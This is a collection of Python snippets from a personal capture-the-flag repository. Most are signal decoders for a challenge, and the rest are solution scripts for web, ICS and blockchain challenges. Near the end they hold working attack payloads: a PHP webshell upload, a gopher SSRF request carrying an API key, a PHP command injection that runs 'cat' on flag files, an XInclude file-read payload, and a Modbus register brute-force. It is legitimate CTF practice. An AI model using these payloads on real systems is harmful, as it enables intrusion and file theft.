                    ascii_str += char
                else:
                    ascii_str += "."  # Non-printable character placeholder
            except ValueError:
                ascii_str += "?"  # Invalid byte

        return ascii_str

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_02.py
    def decode_nrz_i(self, bits: str) -> str:
        """
        Decode NRZ-I (Non-Return-to-Zero Inverted) encoded bits.
        In NRZ-I, a transition (0 to 1 or 1 to 0) represents a 1,
        and no transition represents a 0.
        """

        # Convert string to list of ints
        encoded_bits = list(map(int, bits))
        decoded_bits = []
        # Initial signal level
        current_level = encoded_bits[0]
        decoded_bits.append(current_level)
        for i in range(1, len(encoded_bits)):
            if encoded_bits[i] == 1:
                # Transition: invert current level
                current_level = 1 - current_level
            # else no transition, current_level stays the same
            decoded_bits.append(current_level)
        # Now decoded_bits is the original bit stream
        return decoded_bits

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_02.py
    def decode_manchester(self, bits: str) -> str:
        # Step 1: Decode Manchester pairs to raw bits
        raw_bits = ""
        for i in range(0, len(bits), 2):
            pair = bits[i : i + 2]
            if pair == "10":
                raw_bits += "1"
            elif pair == "01":
                raw_bits += "0"
            else:
                raise ValueError(f"Invalid Manchester encoding: {pair}")

        return raw_bits

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_02.py
    def decode_hamming74(self, bits: str) -> str:
        result = ""
        for i in range(0, len(bits), 7):
            chunk = bits[i : i + 7]
            if len(chunk) < 7:
                continue  # ignore incomplete chunks
            b = list(map(int, chunk))
            # Parity check positions
            p1 = b[0] ^ b[2] ^ b[4] ^ b[6]
            p2 = b[1] ^ b[2] ^ b[5] ^ b[6]
            p3 = b[3] ^ b[4] ^ b[5] ^ b[6]
            error_pos = p1 + (p2 << 1) + (p3 << 2)
            if error_pos != 0:
                b[error_pos - 1] ^= 1  # fix error
            # Extract data bits: positions 3,5,6,7 -> indices 2,4,5,6
            result += "".join(str(b[i]) for i in [2, 4, 5, 6])
        return result

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_02.py
    def decode_uart(
        encoded_bits, baud_rate=9600, data_bits=8, parity=None, stop_bits=1
    ):
        """
        Decode UART encoded bit string to ASCII.
        Assumes:
        - 1 start bit (0)
        - 8 data bits (LSB first)
        - No parity by default
        - 1 stop bit (1)
        encoded_bits is a string of bits representing UART frames concatenated.
        """
        bits = list(map(int, encoded_bits))
        frame_len = 1 + data_bits + (1 if parity else 0) + stop_bits
        if len(bits) % frame_len != 0:
            raise ValueError(
                "UART encoded bits length is not a multiple of frame length"
            )
        decoded_chars = []
        for i in range(0, len(bits), frame_len):
            frame = bits[i : i + frame_len]
            start_bit = frame[0]
            if start_bit != 0:
                raise ValueError("Invalid start bit in UART frame")
            data = frame[1 : 1 + data_bits]
            # Parity check skipped if parity is None
            # Stop bits check
            stop = frame[1 + data_bits + (1 if parity else 0) :]
            if any(s != 1 for s in stop):
                raise ValueError("Invalid stop bit(s) in UART frame")
            # Convert data bits (LSB first) to int
            val = 0
            for idx, bit in enumerate(data):
                val |= bit << idx
            decoded_chars.append(chr(val))
        return "".join(decoded_chars)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_02.py
    def getting_round(self):
        round_text = self.recv_until("> ")
        round_text = round_text.decode()
        round_text = round_text.strip("\n> ")
        round_text = round_text.split("] ")

        print(round_text)
        self.requests.append(round_text)
        print(self.requests)
        # print(round_text)
        if len(round_text) < 2:
            print("Unexpected round format or missing data")
            print(round_text)
            sys.exit(0)
            # raise ValueError("Unexpected round format or missing data")
        match round_text[1]:
            case "[UART":
                bits = round_text[2]
                decoded = self.decode_uart(bits)
            case "[NRZI":
                bits = round_text[2]
                decoded = self.decode_nrz_i(bits)
            case "[Manchester":
                bits = round_text[2]
                decoded = self.decode_manchester(bits)
            case "[Hamming74":
                bits = round_text[2]
                decoded = self.decode_hamming74(bits)
            case _:
                raise ValueError(f"Unknown encoding type: {round_text[0]}")
        decoded = self.ascii_converter(decoded)
        print(f"Decoded: {decoded}")
        self.send(decoded)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_02.py
    def main(self):

        self.requests = []

        text = "011011101110000100111001000010010011111011110000"
        decoded = self.decode_nrz_i(text)
        decoded = self.ascii_converter(decoded)

        text = "100110010110101000011000111110011000101010"
        decoded = self.decode_hamming74(text)
        decoded = self.ascii_converter(decoded)
        # return

        text = "0001011100101010111011010001100110101100100100111001001011000110010111001101100001101011"
        decoded = self.decode_hamming74(text)
        decoded = self.ascii_converter(decoded)

        #

        text = "001101010010100001101100011011001"
        text = "01110110011"
        start = time.time()
        # text = "01010111011010000010010101011000101110110011000001010010011011101101111011001"
        test = "0110001100101110111001011101110010110001100100000101001"
        decoded = self.decode_uart(text)

        decoded = self.ascii_converter(decoded)
        print(f"time: {time.time() - start} - Decoded: {decoded}")
        # print(decoded)

        # return

        self.initiate_connection()
        self.recv_lines(27, display=False)

        for i in range(99):
            try:
                self.getting_round()
            except Exception as e:
                self.saving_requests()
                print(f"Error in round {i}: {e}")
                break

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/chat.py
    def ascii_converter(self, bits: str) -> str:
        return "".join(
            chr(int(bits[i : i + 8], 2))
            for i in range(0, len(bits), 8)
            if len(bits[i : i + 8]) == 8
        )

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/chat.py
    def decode_nrz_i(self, bits: str) -> str:
        result = ""
        current = "0"
        for bit in bits:
            if bit == "1":
                current = "1" if current == "0" else "0"
            result += current
        return result

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/chat.py
    def decode_manchester(self, bits: str) -> str:
        raw_bits = ""
        for i in range(0, len(bits), 2):
            pair = bits[i : i + 2]
            if pair == "10":
                raw_bits += "1"
            elif pair == "01":
                raw_bits += "0"
            else:
                raise ValueError(f"Invalid Manchester encoding: {pair}")
        return raw_bits

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/chat.py
    def decode_hamming74(self, bits: str) -> str:
        result = ""
        for i in range(0, len(bits), 7):
            chunk = bits[i : i + 7]
            if len(chunk) < 7:
                continue
            b = list(map(int, chunk))
            p1 = b[0] ^ b[2] ^ b[4] ^ b[6]
            p2 = b[1] ^ b[2] ^ b[5] ^ b[6]
            p3 = b[3] ^ b[4] ^ b[5] ^ b[6]
            error_pos = p1 + (p2 << 1) + (p3 << 2)
            if error_pos != 0:
                b[error_pos - 1] ^= 1
            result += "".join(str(b[i]) for i in [2, 4, 5, 6])
        return result

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/chat.py
    def decode_uart(self, bits: str) -> str:
        # Try all possible alignments
        for offset in range(10):
            candidate = bits[offset:]
            result = ""
            for i in range(0, len(candidate), 10):
                frame = candidate[i : i + 10]
                if len(frame) != 10:
                    continue
                if frame[0] != "0" or frame[-1] != "1":
                    continue
                data_bits = frame[1:9]
                byte = int(data_bits[::-1], 2)
                result += chr(byte)

        return result

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/chat.py
    def getting_round(self):
        round_text = self.recv_until("> ")
        print(round_text)
        round_text = round_text.decode().strip("\n> ")
        round_text = round_text.split("] ")

        print(round_text)
        if len(round_text) < 2:
            sys.exit(0)  # Unexpected round format or missing data
        protocol = round_text[1]
        bits = round_text[2]

        if protocol == "[UART":
            decoded = self.decode_uart(bits)
        else:
            match protocol:
                case "[NRZI":
                    raw_bits = self.decode_nrz_i(bits)
                case "[Manchester":
                    raw_bits = self.decode_manchester(bits)
                case "[Hamming74":
                    raw_bits = self.decode_hamming74(bits)
                case _:
                    raise ValueError(f"Unknown encoding type: {protocol}")
            decoded = self.ascii_converter(raw_bits)

        print(f"Decoded: {decoded}")
        self.send(decoded)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/chat.py
    def main(self):
        self.initiate_connection()
        self.recv_lines(27, display=False)

        for _ in range(100):
            self.getting_round()

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_01.py
    def ascii_converter1(self, bits: str) -> str:
        # Step 2: Convert bitstream to ASCII
        ascii_text = ""
        for i in range(0, len(bits), 8):
            byte = bits[i : i + 8]
            if len(byte) == 8:
                ascii_text += chr(int(byte, 2))
        return ascii_text

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_01.py
    def ascii_converter(self, bits):
        """
        Convert a string of bits to ASCII characters.
        Input bits should be in multiples of 8 (for standard ASCII).
        Handles padding if needed.
        """
        # Pad with zeros if not multiple of 8
        padded_length = math.ceil(len(bits) / 8) * 8
        padded_bits = bits.ljust(padded_length, "0")

        ascii_str = ""
        for i in range(0, len(padded_bits), 8):
            byte = padded_bits[i : i + 8]
            try:
                char = chr(int(byte, 2))
                # Only add printable ASCII characters
                if 32 <= ord(char) <= 126 or ord(char) in [10, 13]:
                    ascii_str += char
                else:
                    ascii_str += "."  # Non-printable character placeholder
            except ValueError:
                ascii_str += "?"  # Invalid byte

        return ascii_str

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_01.py
    def decode_nrz_i(self, bits: str) -> str:
        # result = ""
        # current = "0"
        # for bit in bits:
        #     if bit == "1":
        #         # toggle the signal
        #         current = "1" if current == "0" else "0"
        #     # bit == "0" means no change
        #     result += current
        # return result
        """
        Decode NRZ-I (Non-Return-to-Zero Inverted) encoded bits.
        In NRZ-I, a transition (0 to 1 or 1 to 0) represents a 1,
        and no transition represents a 0.
        """
        if not bits:
            return ""

        decoded = []
        prev_bit = "1"  # Start with high voltage as reference

        for bit in bits:
            if bit == prev_bit:
                decoded.append("0")
            else:
                decoded.append("1")
            prev_bit = bit

        return "".join(decoded)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_01.py
    def decode_manchester(self, bits: str) -> str:
        # Step 1: Decode Manchester pairs to raw bits
        raw_bits = ""
        for i in range(0, len(bits), 2):
            pair = bits[i : i + 2]
            if pair == "10":
                raw_bits += "1"
            elif pair == "01":
                raw_bits += "0"
            else:
                raise ValueError(f"Invalid Manchester encoding: {pair}")

        return raw_bits

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_01.py
    def decode_hamming74(self, bits: str) -> str:
        result = ""
        for i in range(0, len(bits), 7):
            chunk = bits[i : i + 7]
            if len(chunk) < 7:
                continue  # ignore incomplete chunks
            b = list(map(int, chunk))
            # Parity check positions
            p1 = b[0] ^ b[2] ^ b[4] ^ b[6]
            p2 = b[1] ^ b[2] ^ b[5] ^ b[6]
            p3 = b[3] ^ b[4] ^ b[5] ^ b[6]
            error_pos = p1 + (p2 << 1) + (p3 << 2)
            if error_pos != 0:
                b[error_pos - 1] ^= 1  # fix error
            # Extract data bits: positions 3,5,6,7 -> indices 2,4,5,6
            result += "".join(str(b[i]) for i in [2, 4, 5, 6])
        return result

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_01.py
    def decode_uart(self, bits, baud_rate=9600):
        """
        Decode UART (Universal Asynchronous Receiver-Transmitter) encoded bits.
        UART uses start/stop bits and sends LSB first with no clock signal.
        Assumes 8 data bits, 1 start bit (0), 1 stop bit (1), no parity.
        """
        if len(bits) < 10 or bits[0] != "0":
            return ""  # Invalid UART frame

        char_bits = []
        # Extract the 8 data bits (bits 1-8)
        data_bits = bits[1:9]
        # UART sends LSB first, so we need to reverse
        data_bits = data_bits[::-1]
        char_int = int(data_bits, 2)

        try:
            return chr(char_int)
        except ValueError:
            return ""

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_01.py
    def getting_round(self):
        round_text = self.recv_until("> ")
        print(round_text)
        round_text = round_text.decode()
        round_text = round_text.strip("\n> ")
        round_text = round_text.split("] ")

        # print(round_text)
        if len(round_text) < 2:
            print("Unexpected round format or missing data")
            print(round_text)
            sys.exit(0)
            # raise ValueError("Unexpected round format or missing data")
        match round_text[1]:
            case "[UART":
                bits = round_text[2]
                decoded = self.decode_uart(bits)
            case "[NRZI":
                bits = round_text[2]
                decoded = self.decode_nrz_i(bits)
            case "[Manchester":
                bits = round_text[2]
                decoded = self.decode_manchester(bits)
            case "[Hamming74":
                bits = round_text[2]
                decoded = self.decode_hamming74(bits)
            case _:
                raise ValueError(f"Unknown encoding type: {round_text[0]}")
        decoded = self.ascii_converter(decoded)
        print(f"Decoded: {decoded}")
        self.send(decoded)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_01.py
    def main(self):

        text = "011011101110000100111001000010010011111011110000"
        decoded = self.decode_nrz_i(text)
        decoded = self.ascii_converter(decoded)

        text = "100110010110101000011000111110011000101010"
        decoded = self.decode_hamming74(text)
        decoded = self.ascii_converter(decoded)
        # return

        text = "0001011100101010111011010001100110101100100100111001001011000110010111001101100001101011"
        decoded = self.decode_hamming74(text)
        decoded = self.ascii_converter(decoded)

        #

        text = "001101010010100001101100011011001"
        start = time.time()
        text = "01010111011010000010010101011000101110110011000001010010011011101101111011001"
        decoded = self.decode_uart(text)

        decoded = self.ascii_converter(decoded)
        print(f"time: {time.time() - start}")
        # print(decoded)

        return

        self.initiate_connection()
        self.recv_lines(27, display=False)

        for i in range(99):
            self.getting_round()

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_04.py
    def saving_requests(self):
        """
        Save the requests made during the challenge to a file.
        This can help in debugging or understanding the flow of the challenge.
        """

        setted_requests = set()
        for req in self.requests:
            if isinstance(req, list) and len(req) > 1:
                setted_requests.add(tuple(req))
            elif isinstance(req, str):
                setted_requests.add((req,))

        with open(self.folfil("data", "requests.json"), "r") as f:
            requests = json.load(f)
        with open(self.folfil("data", "requests.json"), "w") as f:
            if not isinstance(requests, list):
                requests = []
            requests.extend(setted_requests)
            json.dump(requests, f, indent=4)
        print(f"Saved {len(self.requests)} requests to data/requests.json")

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_04.py
    def nrzi_formater_for_rest(self, bits: list):
        # padded_length = math.ceil(len(bits) / 8) * 8
        last_bits = len(bits) % 8
        if last_bits == 0:
            return bits

        valid_bits = bits[: len(bits) - last_bits]
        rest_of_bits = bits[len(bits) - last_bits :]
        print(
            f"Valid bits: {valid_bits}, Rest of bits: {rest_of_bits}, Last bits: {last_bits}"
        )
        rest_of_bits = [0] * (8 - last_bits) + rest_of_bits
        # Pad with zeros to make it a multiple of 8
        print(f"Rest of bits: {rest_of_bits}")

        return valid_bits + rest_of_bits

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_04.py
    def nrzi_formater(self, bits: list):
        bits = [0] * (len(bits) % 8) + bits
        return bits

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_04.py
    def bits_to_ascii(self, bits):
        """
        Convert a list of bits (ints) to ASCII string.
        Assumes 8 bits per character, MSB first.
        """
        if len(bits) % 8 != 0:
            # Pad with zeros if not multiple of 8
            raise ValueError("Number of bits is not a multiple of 8")
        chars = []
        for i in range(0, len(bits), 8):
            byte = bits[i : i + 8]
            val = 0
            for bit in byte:
                val = (val << 1) | bit
            chars.append(chr(val))
        return "".join(chars)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_04.py
    def decode_nrzi(self, bits: str) -> str:
        """
        Decode NRZ-I (Non-Return-to-Zero Inverted) encoded bits.
        In NRZ-I, a transition (0 to 1 or 1 to 0) represents a 1,
        and no transition represents a 0.
        """

        # Convert string to list of ints
        encoded_bits = list(map(int, bits))
        # Initial signal level
        current_level = encoded_bits[0]
        decoded_bits = []
        decoded_bits.append(current_level)
        for i in range(1, len(encoded_bits)):
            if encoded_bits[i] == 1:
                # Transition: invert current level
                current_level = 1 - current_level
            # else no transition, current_level stays the same
            decoded_bits.append(current_level)
        # Now decoded_bits is the original bit stream
        # print(f"Decoded NRZI bits: {decoded_bits}")
        # print("".join([str(bit) for bit in decoded_bits]))
        # decoded_bits = self.nrzi_formater(decoded_bits)
        return self.bits_to_ascii(decoded_bits)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_04.py
    def decode_manchester(self, encoded_bits):
        """
        Decode Manchester encoded bit string to ASCII.
        Manchester encoding: each bit is two bits:
        '01' -> 0
        '10' -> 1
        """
        bits = encoded_bits
        if len(bits) % 2 != 0:
            raise ValueError("Manchester encoded bits length must be even")
        decoded_bits = []
        for i in range(0, len(bits), 2):
            pair = bits[i : i + 2]
            if pair == "01":
                decoded_bits.append(0)
            elif pair == "10":
                decoded_bits.append(1)
            else:
                raise ValueError(f"Invalid Manchester encoding pair: {pair}")
        return self.bits_to_ascii(decoded_bits)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_04.py
    def decode_hamming74(self, encoded_bits):
        """
        Decode a Hamming (7,4) encoded bit string to ASCII.
        Each 7 bits contain 4 data bits and 3 parity bits.
        Returns ASCII decoded string.
        """

        def hamming_correct_and_extract(bits7):
            # bits7 is a list of 7 bits (ints)
            # Hamming (7,4) bit positions (1-based):
            # Positions: 1 2 3 4 5 6 7
            # Bits:      p1 p2 d1 p3 d2 d3 d4
            # parity bits: p1=bit1, p2=bit2, p3=bit4
            p1, p2, d1, p3, d2, d3, d4 = bits7
            # Calculate syndrome bits
            s1 = p1 ^ d1 ^ d2 ^ d4
            s2 = p2 ^ d1 ^ d3 ^ d4
            s3 = p3 ^ d2 ^ d3 ^ d4
            syndrome = (s3 << 2) | (s2 << 1) | s1
            # Correct error if syndrome != 0
            if syndrome != 0:
                error_pos = syndrome - 1  # zero-based index
                bits7[error_pos] ^= 1
                # Reassign corrected bits
                p1, p2, d1, p3, d2, d3, d4 = bits7
            # Extract data bits
            return [d1, d2, d3, d4]

        bits = list(map(int, encoded_bits))
        if len(bits) % 7 != 0:
            raise ValueError("Hamming (7,4) encoded bits length must be multiple of 7")
        decoded_bits = []
        for i in range(0, len(bits), 7):
            block = bits[i : i + 7]
            data_bits = hamming_correct_and_extract(block)
            decoded_bits.extend(data_bits)
        return self.bits_to_ascii(decoded_bits)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_04.py
    def decode_uart(
        self, encoded_bits, baud_rate=9600, data_bits=8, parity=1, stop_bits=1
    ):
        """
        Decode UART encoded bit string to ASCII.
        Assumes:
        - 1 start bit (0)
        - 8 data bits (LSB first)
        - 1 parity by default
        - 1 stop bit (1)
        encoded_bits is a string of bits representing UART frames concatenated.
        """
        bits = list(map(int, encoded_bits))
        frame_len = 1 + data_bits + (1 if parity else 0) + stop_bits
        if len(bits) % frame_len != 0:
            raise ValueError(
                "UART encoded bits length is not a multiple of frame length"
            )
        decoded_chars = []
        for i in range(0, len(bits), frame_len):
            frame = bits[i : i + frame_len]
            start_bit = frame[0]
            if start_bit != 0:
                raise ValueError("Invalid start bit in UART frame")
            data = frame[1 : 1 + data_bits]
            # Parity check skipped if parity is None
            # Stop bits check
            stop = frame[1 + data_bits + (1 if parity else 0) :]
            if any(s != 1 for s in stop):
                raise ValueError("Invalid stop bit(s) in UART frame")
            # Convert data bits (LSB first) to int
            val = 0
            for idx, bit in enumerate(data):
                val |= bit << idx
            decoded_chars.append(chr(val))
        return "".join(decoded_chars)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_04.py
    def getting_round(self):
        round_text = self.recv_until("> ")
        round_text = round_text.decode()
        round_text = round_text.strip("\n> ")
        round_text = round_text.split("] ")

        print(round_text)
        self.requests.append(round_text)
        # print(self.requests)
        # print(round_text)
        if len(round_text) < 2:
            print("Unexpected round format or missing data")
            print(round_text)
            sys.exit(0)
            # raise ValueError("Unexpected round format or missing data")
        match round_text[1]:
            case "[UART":
                bits = round_text[2]
                decoded = self.decode_uart(bits)
            case "[NRZI":
                bits = round_text[2]
                decoded = self.decode_nrzi(bits)
            case "[Manchester":
                bits = round_text[2]
                decoded = self.decode_manchester(bits)
            case "[Hamming74":
                bits = round_text[2]
                decoded = self.decode_hamming74(bits)
            case _:
                raise ValueError(f"Unknown encoding type: {round_text[0]}")
        print(f"Decoded: {decoded}")
        self.send(decoded)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_04.py
    def main(self):

        self.requests = []

        # text = "011011101110000100111001000010010011111011110000"
        # text = "001011111001100110010011100000111010010110100011"
        # text = "010010000110001110110000"
        # text = "100010001010101000"
        # decoded_result = "110110101010101011"
        # text = "001000111000100001001010"
        # decoded = self.decode_nrzi(text)
        # print(decoded)

        # return
        # text = "100110010110101000011000111110011000101010"
        # decoded = self.decode_hamming74(text)
        # # return

        # text = "0001011100101010111011010001100110101100100100111001001011000110010111001101100001101011"
        # decoded = self.decode_hamming74(text)

        # #

        # text = "001101010010100001101100011011001"
        # text = "01110110011"
        # start = time.time()
        # # text = "01010111011010000010010101011000101110110011000001010010011011101101111011001"
        # test = "0110001100101110111001011101110010110001100100000101001"

        # print(f"time: {time.time() - start} - Decoded: {decoded}")
        # # print(decoded)

        # test = "01110011011000001010010111011100100010011011000010110110010110100100101111011"
        # 0 11100110 1 1
        # 0 00001010 0 1
        # 0 11101110 0 1
        # 0 00100110 1 1
        # 0 00010110 1 1
        # 0 01011010 0 1
        # 0 01011110 1 1

        # for i in range(len(test) // 11):
        #     print(
        #         f"start: {test[i*11]} | bits: {test[i*11 + 1:(i*11)+8 + 1]} | parity: {test[i*11 + 9 ]} | stop: {test[i*11 + 10]}"
        #     )

        self.initiate_connection()
        self.recv_lines(27, display=False)

        for i in range(99):
            try:
                self.getting_round()
            except Exception as e:
                self.saving_requests()
                print(f"Error in round {i}: {e}")
                break

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Blackjack/payloads/solution.py
    def main(self):
        pass

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Holding_Secrets/payloads/solution.py
    def initiate_connection(self):
        self.client = ModbusTcpClient(self.url, port=self.port)
        self.client.connect()

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Holding_Secrets/payloads/solution.py
    def bruteforce_address(self, start=0, number=1000, count=125, verbose=False):
        if start > number:
            raise ValueError(
                "Start address must be less than the number of addresses to check."
            )
        for i in range(start, number):
            result = self.client.read_holding_registers(address=i, count=count)

            if any(result.registers) and result.registers[-1] == 0:
                return i
            if verbose:
                print(f"Reading holding registers at address {i}...")
                if not result.isError():
                    print("Registers:", result.registers)
                else:
                    print("Error reading registers:", result)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Holding_Secrets/payloads/solution.py
    def get_registers(self, address, count=125):
        result = self.client.read_holding_registers(address=address, count=count)
        if not result.isError():
            return result.registers
        else:
            print("Error reading registers:", result)
            return None

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Holding_Secrets/payloads/solution.py
    def main(self):
        self.initiate_connection()
        address = self.bruteforce_address(verbose=True)
        print(address)  # 935
        registers = self.get_registers(address)
        flag = "".join(chr(r) for r in registers if r != 0)
        print(flag)
        self.client.close()

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Holding_Secrets/payloads/attempt_01.py
    def socket_initiate_connection(self):

        with socket.create_connection((self.url, self.port), timeout=10) as s:
            # Receive initial banner or prompt
            data = s.recv(4096)
            print("Received:", data.decode(errors="ignore"))

            # Example: send a newline or command if required by the challenge
            s.sendall(b"\n")
            response = s.recv(4096)
            print("Response:", response.decode(errors="ignore"))

            # Try common commands if it's a text interface
            for cmd in [b"status\n", b"secret\n", b"help\n", b"info\n"]:
                s.sendall(cmd)
                resp = s.recv(4096)
                print(f"Sent {cmd.strip().decode()}: {resp.decode(errors='ignore')}")

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Holding_Secrets/payloads/attempt_01.py
    def plc_initiate_connection(self):
        # try:
        with LogixDriver("challenge.hackthat.site/55373") as plc:
            print("Connected to PLC")
            tag_value = plc.read("Flag")
            print(f"Flag value: {tag_value}")

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Holding_Secrets/payloads/attempt_01.py
    def snap_initiate_connection(self):
        self.client = Client()
        self.client.connect(self.url, self.port)
        result = self.client.read_area(
            area=snap7_util.snap7.types.Areas.DB, db_number=1, start=0, size=100
        )
        print(result)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Holding_Secrets/payloads/attempt_01.py
    def plc_work(self, solution, plc):

        print(plc.get_tags())

        return

        tag = LogixTag(name="Flag", tag_type=LogixTagType.STRING)
        plc.add_tag(tag)

        # Read the flag from the PLC
        flag = plc.read("Flag")
        if flag:
            print(f"Flag: {flag.value}")
        else:
            print("Failed to read the flag from PLC")

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/Holding_Secrets/payloads/attempt_01.py
    def main(self):
        self.plc_initiate_connection()

	# /home/figaro/CTF/Categories/Blockchain/HTB/Russian_Roulette/payloads/solution.py
    def __init__(self, conn: str, file: str, url: str, port: str, **args):
        super().__init__(conn, file, url, port)
        self.pwn.context.log_level = "error"
        self.ip = args.HOST
        self.rpc_port = args.RPC_PORT
        self.tcp_port = args.TCP_PORT
        self.RPC_URL = f"http://{self.ip}:{int(self.rpc_port)}/"
        self.tcp_url = f"{self.ip}:{int(self.tcp_port)}"

	# /home/figaro/CTF/Categories/Blockchain/HTB/Russian_Roulette/payloads/solution.py
    def main(self):

        # self.initiate_connection()

        connection_info = {}

        # connect to challenge handler and get connection info
        with self.pwn.remote(
            self.TCP_URL.split(":")[0], int(self.TCP_URL.split(":")[1])
        ) as p:
            p.sendlineafter(b"action? ", b"1")
            data = p.recvall()

        lines = data.decode().split("\n")
        for line in lines:
            if line:
                key, value = line.strip().split(" :  ")
                connection_info[key] = value

        print(connection_info)
        self.pvk = connection_info["Private key    "]
        self.setup = connection_info["Setup contract "]
        target = connection_info["Target contract"]

        while True:
            # try luck
            self.csend(target, "pullTrigger()")

            # get flag
            with self.pwn.remote(
                self.TCP_URL.split(":")[0], int(self.TCP_URL.split(":")[1])
            ) as p:
                p.recvuntil(b"action? ")
                p.sendline(b"3")
                flag = p.recvall().decode()

            if "HTB" in flag:
                print(f"\n\n[*] {flag}")
                break

	# /home/figaro/CTF/Categories/Blockchain/HTB/Russian_Roulette/payloads/solution.py
    def csend(self, contract: str, fn: str, *args):
        print(
            f"cast send {contract} '{fn}' --rpc-url  {self.RPC_URL} --private-key {self.pvk}"
        )
        system(
            f"cast send {contract} '{fn}' --rpc-url {self.RPC_URL} --private-key {self.pvk}"
        )

	# /home/figaro/CTF/Categories/Web/picoCTF/Trickster/payloads/solution.py
    def reconstructing_url(self):
        self.complete_url = f"http://{self.url}:{self.port}"

	# /home/figaro/CTF/Categories/Web/picoCTF/Trickster/payloads/solution.py
    def send_file(self, file):
        url = self.complete_url + "/upload"
        with open(file, "rb") as f:
            files = {"file": f}
            response = requests.post(url, files=files)
        if response.status_code == 200:
            return response.json()
        else:
            return response.text

	# /home/figaro/CTF/Categories/Web/picoCTF/Trickster/payloads/solution.py
    def get_request(self, path):
        url = "/".join([self.complete_url, path])
        response = requests.get(url)
        if response.status_code == 200:
            # return response.json()
            return response.text
        else:
            return response.text

	# /home/figaro/CTF/Categories/Web/picoCTF/Trickster/payloads/solution.py
    def main(self):
        self.reconstructing_url()
        # robots = self.get_request("robots.txt")
        # print(robots)
        # instructions = self.get_request("instructions.txt")
        # print(instructions)
        payload = self.Path(self.folder_payloads, "webshell.png.php")
        self.send_file(payload)

	# /home/figaro/CTF/Categories/Web/bsides/PageOneHTML/payloads/solution.py
    def main(self):

        url = "http://94.237.59.174:59356/api/convert"
        headers = {"Content-Type": "application/json"}
        data = {
            # "markdown_content": "![flag](gopher://127.0.0.1:80/_GET /api/dev HTTP/1.1%0d%0aHost:127.0.0.1%0d%0aX-Api-Key:934caf984a4ca94817ea6d87d37af4b3%0d%0a%0d%0a)",
            # "markdown_content": "![test](http://127.0.0.1/)",
            "markdown_content": "![flag](gopher://127.0.0.1:80/_GET%20/api/dev%20HTTP/1.1%0d%0aHost:127.0.0.1%0d%0aX-Api-Key:934caf984a4ca94817ea6d87d37af4b3%0d%0a%0d%0a)",
            "port_images": True,
        }

        response = requests.post(url, json=data, headers=headers)
        if response.status_code == 200:
            print("Request successful!")
            print(response.json())
        else:
            print(f"Request failed with status code: {response.status_code}")
            print(response.text)

	# /home/figaro/CTF/Categories/Web/bsides/SimPlay/payloads/solution.py
    def main(self):
        url = f"http://{self.url}:{self.port}"  # Replace with actual challenge IP or domain
        payload = 'Y-m-d"; system("cat /www/flag"); //'
        payload = 'Y-m-d"); system("ls /"); //'
        payload = 'Y-m-d"); system("cat /flagxTtZD"); //'
        r = requests.get(url, params={"format": payload})
        print(r.text)

	# /home/figaro/CTF/Categories/Web/ECSC/Memes/payloads/solution.py
    def main(self):
        self.new_url = f"http://{self.url}:{self.port}/api/generate"
        self.generating()

	# /home/figaro/CTF/Categories/Web/ECSC/Memes/payloads/solution.py
    def generating(self):

        exploit = f"""</text><text x=\"10\" y=\"50\" font-size=\"20\" fill=\"black\" xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\".?../../../../app/flag.txt\" parse=\"text\"/></text><text>
                """

        payload = {
            "name": "everywhere",
            "topText": exploit,
            "bottomText": "lol",
        }

